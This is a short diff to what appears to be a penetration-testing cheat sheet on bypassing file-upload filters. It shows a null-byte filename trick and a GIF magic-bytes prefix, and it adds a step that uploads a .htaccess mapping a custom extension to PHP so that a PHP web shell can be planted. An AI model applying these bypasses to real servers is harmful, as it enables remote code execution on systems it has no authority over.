@@ -9,6 +9,11 @@ filename="hi.php%00.jpg"
 #Magic Bytes
 GIF89a;
 
+#Upload .htaccess
+cat .htaccess 
+AddType application/x-httpd-php .evil
+--> upload php shell as cmd.evil
+
 
 #Exploit-Payload
 
